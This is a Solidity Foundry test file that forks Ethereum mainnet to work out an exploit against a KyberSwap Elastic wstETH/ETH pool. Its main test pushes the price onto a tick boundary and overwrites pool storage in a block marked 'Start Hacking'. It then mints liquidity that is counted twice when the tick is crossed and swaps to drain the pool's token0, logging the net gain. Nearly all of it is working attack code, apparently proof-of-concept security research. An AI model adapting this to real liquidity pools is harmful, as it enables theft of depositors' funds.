// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "helpers/Pretty.sol";
import "helpers/BitUtils.sol";


import "forge-std/interfaces/IERC20.sol";

import "src/interfaces/IPool.sol";
import "src/interfaces/periphery/IRouter.sol";
import "src/interfaces/periphery/IBasePositionManager.sol";
import {MathConstants as C} from 'src/libraries/MathConstants.sol';

import {FullMath} from 'src/libraries/FullMath.sol';
import "src/libraries/TickMath.sol";
import "src/libraries/QtyDeltaMath.sol";
import "src/libraries/SwapMath.sol";

contract KyberswapTest is Test {

    using stdStorage for StdStorage;

    using Pretty for uint256;
    using Pretty for int256;
    using Pretty for uint160;
    using Pretty for int160;
    using Pretty for uint128;
    using Pretty for int128;
    using Pretty for uint8;
    string API_ENDPOINT;

    address WETH_addr = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address wstETH_addr = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;

    IERC20 wstETH = IERC20(wstETH_addr);
    IERC20 WETH = IERC20(WETH_addr);

    IPool wstETH_ETH = IPool(0xeBfE63Ba0264aD639B3C41d2bfE1aD708F683bc8);

    IRouter router = IRouter(0xC1e7dFE73E1598E3910EF4C7845B68A9Ab6F4c83);
    IBasePositionManager positionManager = IBasePositionManager(0x2B1c7b41f6A8F2b2bc45C3233a5d5FB3cD6dC9A8);

    bytes32 SQRTP_INDEX = bytes32(uint256(3));
    bytes32 BASEL_INDEX = bytes32(uint256(4));

    function setUp() public {
        API_ENDPOINT = vm.envString("EVMNET_FORK_URL");
        // Optionally pass a second argument to choose the block number
        vm.createSelectFork(API_ENDPOINT, 17029900);
        deal(wstETH_addr, address(this), 10_000_000_000e18);
        deal(WETH_addr, address(this), 10_000_000_000e18);
        wstETH.approve(address(router), type(uint256).max);
        WETH.approve(address(router), type(uint256).max);
        wstETH.approve(address(positionManager), type(uint256).max);
        WETH.approve(address(positionManager), type(uint256).max);
    }

    function notestLiquidity() public view {
        int24 TARGET_TICK = -100_000;
        int256 amount = QtyDeltaMath.calcRequiredQty1(
            TickMath.getSqrtRatioAtTick(TARGET_TICK),
            TickMath.getSqrtRatioAtTick(TARGET_TICK + 1),
            2**96,
            true);
        console.log("token1 required = %s", amount.pretty());

    }


    function notestEasyHack() public {
        int24 currentTick = getCurrentTick();
        uint160 targetSqrtP = TickMath.getSqrtRatioAtTick(currentTick);

        uint256 outerSnapshotId = vm.snapshot();

        int160 diff = 100;
        uint128 i = 1;
        uint128 limit = 5;

        int160 smallest = 1e18;

        while (diff != 0 && i < limit) {

            vm.revertTo(outerSnapshotId);
            outerSnapshotId = vm.snapshot();
            uint128 AMOUNT = 1_000_000_000e18 + i;
            positionManager.mint(getMintParams(currentTick, currentTick + 1, AMOUNT, AMOUNT));
            logPoolState();

            uint256 reachAmount = getReachAmount(targetSqrtP);
            uint256 low  = reachAmount * (C.FEE_UNITS + wstETH_ETH.swapFeeUnits() - 1) / C.FEE_UNITS;
            uint256 high = reachAmount * (C.FEE_UNITS + wstETH_ETH.swapFeeUnits()) / C.FEE_UNITS;

            uint256 innerSnapshotId = vm.snapshot();
            uint256 steps = 0;
            while (low < high) {
                uint256 mid = (low + high)/2;
                vm.revertTo(innerSnapshotId);
                innerSnapshotId = vm.snapshot();
                router.swapExactInputSingle(getExactInputSingleParams(mid, true));
                diff = int160(getSqrtP()) - int160(targetSqrtP);
                if (diff < 0) { // swapped too much
                    high = mid;
                } else if (diff > 0) { // swapped too little
                    low = mid + 1;
                } else { // diff == 0
                    low = mid;
                    high = mid;
                }
                console.log("mid = %s , diff = %s", mid.pretty(), diff.pretty());
                steps += 1;
            }
            console.log("BLAH %s %s", getSqrtP().pretty(), targetSqrtP.pretty());
            console.log("steps = %s", steps);
            if (diff >= 0 && smallest > diff)  {
                smallest = diff;
            }
            console.log("i = %s", i);
//            console.log("low = %s , high = %s , diff = %s", low.pretty(), high.pretty(), diff.pretty());
            i++;
        }

        console.log("smallest = %s", smallest.pretty());
        // for (uint256 i = 0; i < 10; i++) {
        //   vm.revertTo(snapshotId);
        //   snapshotId = vm.snapshot();
        //   // reachAmount = getReachAmount(targetSqrtP) * multiplier / C.FEE_UNITS;
        //   reachAmount = uint256(QtyDeltaMath.calcRequiredQty0(targetSqrtP, getSqrtP(), getLiquidity(), true));
        //   console.log("reachAmount = %s", (reachAmount + i).pretty());
        //   router.swapExactInputSingle(getExactInputSingleParams(reachAmount + i, true));
        //   uint160 newSqrtP = getSqrtP();
        //   int160 diff = int160(newSqrtP) - int160(targetSqrtP);
        //   console.log("diff = %s", diff.pretty());
        // }






        // for (; i < 1001; i++) {
        //   vm.revertTo(snapshotId);
        //   snapshotId = vm.snapshot();
        //   logPoolState();
        //   positionManager.mint(getMintParams(currentTick, currentTick + 1, i, i));
        //   reachAmount = getReachAmount(targetSqrtP);
        //   console.log("reachAmount = %s", reachAmount.pretty());
        //   if (reachAmount == 0) { break; }
        //   router.swapExactInputSingle(getExactInputSingleParams(reachAmount + 1, true));
        //   uint160 newSqrtP = getSqrtP();
        //   console.log("diff = %s", (newSqrtP - targetSqrtP).pretty());
        //   if (newSqrtP - targetSqrtP == 0){
        //     break;
        //   }

        // }
        // console.log("reachAmount = %s", reachAmount.pretty());
        // console.log("targetSqrtP = %s", targetSqrtP.pretty());
        // console.log("i = %s", i);
    }

    function testBidDownPrice() public {
        int24 TARGET_TICK = -100_000;

        uint256 marketPrice = token0InToken1(getSqrtP());
        logBalances(marketPrice);

        int24 nearestCurrentTick = getNearestCurrentTick();
        int24 currentTick = getCurrentTick();
        int256 token0Received = 0;
        int256 token1Received = 0;


        // STEP 1
        // Dump a large amount of liquidity at the target tick



        // STEP 2
        while (currentTick > TARGET_TICK) {
          uint160 sqrtP = getSqrtP();
          uint160 targetSqrtP = TickMath.getSqrtRatioAtTick(nearestCurrentTick) - 1;
          console.log("Calculating amount required between %s and %s", sqrtP, targetSqrtP);
          int256 amount0Required =
            SwapMath.calcReachAmount(
                getLiquidity(),
                sqrtP,
                targetSqrtP,
                wstETH_ETH.swapFeeUnits(),
                true,
                true
            );
          token0Received -= amount0Required; // spending token0
          console.log("amount0Required = %s", amount0Required.pretty());
          token1Received += int256(router.swapExactInputSingle(getExactInputSingleParams(uint256(amount0Required)*10005/10000, true)));
          nearestCurrentTick = getNearestCurrentTick();
          currentTick = getCurrentTick();
          logPoolState();
        }

        console.log("========");
        console.log("token0 spent (before hack) = %s", (-token0Received).pretty());
        console.log("current price (token1/token0)= %s", token0InToken1(TickMath.getSqrtRatioAtTick(getCurrentTick())).pretty());

        // Start Hacking
        (,int24 next) = wstETH_ETH.initializedTicks(getNearestCurrentTick());
        console.log("next = %s", vm.toString(next));
        setSqrtP(TickMath.getSqrtRatioAtTick(next));
        setCurrentTick(next);
        // Finished hacking

        logBalances(marketPrice);
        logPoolState();


        (,uint128 liqAdded,uint256 amount0Added,) = positionManager.mint(getMintParams(next, next+1, getToken0Balance()/2, getToken0Balance()/2));
        console.log("liqAdded = %s", liqAdded.pretty());
        console.log("--- Liquidity should be added once ---");
        token0Received -= int128(int256(amount0Added));
        logPoolState();

        router.swapExactInputSingle(getExactInputSingleParams(1, false)); // cross the tick and get the double add
        console.log("--- Liquidity should be added twice ---");
        logPoolState();

        console.log("price = %s", token0InToken1(getSqrtP()).pretty());
        uint256 token1RequiredToDrain =  getToken0Balance() * token0InToken1(getSqrtP()) / 1e18 ;
        console.log("token1RequiredToDrain = %s", token1RequiredToDrain.pretty());
        token1Received -= int256(token1RequiredToDrain);
        uint256 token0Out = router.swapExactInputSingle(getExactInputSingleParams(token1RequiredToDrain, false)); // swap one-for-zero
        logPoolState();
        token0Received += int256(token0Out);
        logBalances(marketPrice);
        console.log("token0 net = %s", token0Received.pretty());
        console.log("token1 net = %s", token1Received.pretty());


    }

    function notestDoubleCount() public {
        uint256 snapshotId = vm.snapshot();
        uint128 liquidityWithDouble = doTestDoubleCount(true);
        vm.revertTo(snapshotId);
        console.log("==================================================");
        uint128 liquidityWithoutDouble = doTestDoubleCount(false);
        console.log("==================================================");
        console.log("Liquidity double counted = %s", (liquidityWithDouble - liquidityWithoutDouble).pretty());
    }

    function doTestDoubleCount(bool doDoubleCount) internal returns (uint128) {
        setLiquidity(2**96*uint128(11000)/10000);

        int24 nearestCurrentTick = getNearestCurrentTick();
        logTick(getCurrentTick());
        logTick(nearestCurrentTick);
        int24 tickOnBoundary = nearestCurrentTick;
        console.log("tickOnBoundary = %s", vm.toString(tickOnBoundary));
        setCurrentTick(nearestCurrentTick);
        uint160 price = TickMath.getSqrtRatioAtTick(getCurrentTick());
        setSqrtP(price);
        console.log("--- Initial pool state ---");
        logPoolState();

        if (doDoubleCount) {
          console.log("--- Swap backwards without moving price ---");
          IRouter.ExactInputSingleParams memory backwardsParams = getExactInputSingleParams(1, true);
          router.swapExactInputSingle(backwardsParams);
          logPoolState();
        }

        ////////////////

        console.log("--- Add liquidity to tick %s ---", vm.toString(tickOnBoundary));
        nearestCurrentTick = getNearestCurrentTick();
        (int24 prev, int24 next) = wstETH_ETH.initializedTicks(nearestCurrentTick);
        console.log("%s < %s < %s", vm.toString(prev), vm.toString(nearestCurrentTick), vm.toString(next));

        console.log("Adding liquidity to (%s , %s)", vm.toString(tickOnBoundary), vm.toString(tickOnBoundary + 1));
        IBasePositionManager.MintParams memory mintParams = getMintParams(tickOnBoundary, tickOnBoundary + 1, 40_000e18, 1_000_000e18);
        (,uint128 liqAdded,,) = positionManager.mint(mintParams);
          console.log("Liquidity added to tick %s = %s", vm.toString(tickOnBoundary), liqAdded.pretty());
          logTick(tickOnBoundary);
          logPoolState();

        IRouter.ExactInputSingleParams memory forwardsParams = getExactInputSingleParams(1, false);
        router.swapExactInputSingle(forwardsParams);
        logPoolState();
        return getLiquidity();
    }


    /********** HELPERS ***********/

    function logBalances(uint256 marketPrice) internal view {
        uint256 token0Bal = getToken0Balance();
        uint256 token1Bal = getToken1Balance();
        console.log("Balances {");
        console.log("  token0Bal = %s", token0Bal.pretty());
        console.log("  token1Bal = %s", token1Bal.pretty());
        console.log("  marketPrice (token1/token0)", marketPrice.pretty());
        uint256 token1Value = token0Bal * marketPrice / 1e18 + token1Bal;
        console.log("  Total value (in token1) = %s", token1Value.pretty());
        console.log("}");
    }

    function getToken0Balance() internal view returns (uint128) {
        return uint128(wstETH_ETH.token0().balanceOf(address(wstETH_ETH)));
    }

    function getToken1Balance() internal view returns (uint128) {
        return uint128(wstETH_ETH.token1().balanceOf(address(wstETH_ETH)));
    }

    function logPoolState() internal view {
        (uint160 sqrtP,int24 currentTick,int24 nearestCurrentTick,) = wstETH_ETH.getPoolState();
        (uint128 baseL,,) = wstETH_ETH.getLiquidityState();
        console.log("PoolState {");
        console.log("  sqrtP       = %s", sqrtP);
        console.log("  currentTick = %s", vm.toString(currentTick));
        console.log("  nearestCurrentTick = %s", vm.toString(nearestCurrentTick));
        console.log("  baseL       = %s", baseL.pretty());
        console.log("}");
    }

    function logTick(int24 tick) internal view {
      (uint128 liquidityGross,int128 liquidityNet,,) = wstETH_ETH.ticks(tick);
      console.log("Tick %s {", vm.toString(tick));
      console.log("  liquidityGross = %s", liquidityGross.pretty());
      console.log("  liquidityNet = %s", liquidityNet.pretty());
      console.log("}");
    }

    function token1InToken0(uint160 price) internal view returns (uint256) {
        return 10**(wstETH.decimals() + WETH.decimals()) / token0InToken1(price);
    }

    function token0InToken1(uint160 price) internal view returns (uint256) {
        return 10**(18 + wstETH.decimals() - WETH.decimals()) * (uint256(price) * price) >> 192;
    }

    function getSqrtP() internal view returns (uint160) {
        (uint160 sqrtP,,,) = wstETH_ETH.getPoolState();
        return sqrtP;
    }

    function getCurrentTick() internal view returns (int24) {
        (,int24 currentTick,,) = wstETH_ETH.getPoolState();
        return currentTick;
    }

    function getNearestCurrentTick() internal view returns (int24) {
        (,,int24 nearestCurrentTick,) = wstETH_ETH.getPoolState();
        return nearestCurrentTick;
    }

    function getLiquidity() internal view returns (uint128) {
        (uint128 baseL,,) = wstETH_ETH.getLiquidityState();
        return baseL;
    }

    function setLiquidity(uint128 liquidity) internal {
        setSlotBitRange(BASEL_INDEX, 0, 128, uint256(liquidity));
    }

    function setSqrtP(uint160 sqrtP) internal {
        setSlotBitRange(SQRTP_INDEX, 0, 160, uint256(sqrtP));
    }

    function setCurrentTick(int24 currentTick) internal {
        setSlotBitRange(SQRTP_INDEX, 184, 24, uint256(uint24(currentTick)));
    }

    function setNearestCurrentTick(int24 nearestCurrentTick) internal {
        setSlotBitRange(SQRTP_INDEX, 160, 24, uint256(uint24(nearestCurrentTick)));
    }

    /* TODO: Factor these out into a Foundry extension library */

    function getSlotBitRange(bytes32 slotIndex, uint8 start, uint16 length) internal view returns (uint256) {
        return BitUtils.getBitRange(vm.load(address(wstETH_ETH), slotIndex), start, length);
    }

    function setSlotBitRange(bytes32 slotIndex, uint8 start, uint16 length, uint256 value) internal {
        bytes32 slot = vm.load(address(wstETH_ETH), slotIndex);
        vm.store(address(wstETH_ETH), slotIndex, BitUtils.setBitRange(slot, start,length, value));
    }

    function incSlot(bytes32 slot, uint256 n) internal pure returns (bytes32) {
        return bytes32(uint256(slot) + n);
    }

    function storeOffset(address addr, bytes32 slot, uint256 offset, bytes32 value) internal {
        vm.store(addr, bytes32(uint256(slot) + offset), value);
    }

    function getReachAmount(uint160 targetSqrtP) internal view returns (uint256) {
        uint160 sqrtP = getSqrtP();
        uint128 liquidity = getLiquidity();
        uint256 numerator = FullMath.mulDivFloor(
          liquidity,
          sqrtP - targetSqrtP,
          sqrtP
        );
        return FullMath.mulDivFloor(numerator, C.TWO_POW_96, sqrtP);
    }

    function getExactInputSingleParams(uint256 amount, bool zeroForOne) internal view returns (IRouter.ExactInputSingleParams memory) {
        IRouter.ExactInputSingleParams memory params =
          IRouter.ExactInputSingleParams(
            zeroForOne ? wstETH_addr : WETH_addr ,
            zeroForOne ? WETH_addr : wstETH_addr,
            wstETH_ETH.swapFeeUnits(),
            address(this),
            block.timestamp + 86400,
            amount,
            0,
            0
          );
        return params;
    }
    function getMintParams(int24 lowerTick, int24 upperTick, uint128 amount0, uint128 amount1) internal view returns (IBasePositionManager.MintParams memory) {
        int24[2] memory ticksPrevious;
        int24 nearestCurrentTick = getNearestCurrentTick();
        ticksPrevious[0] = nearestCurrentTick;
        ticksPrevious[1] = nearestCurrentTick;

        return IBasePositionManager.MintParams(
            wstETH_addr,
            WETH_addr,
            wstETH_ETH.swapFeeUnits(),
            lowerTick,
            upperTick,
            ticksPrevious,
            amount0,
            amount1,
            0,
            0,
            address(this),
            block.timestamp + 86400
        );


    }

}
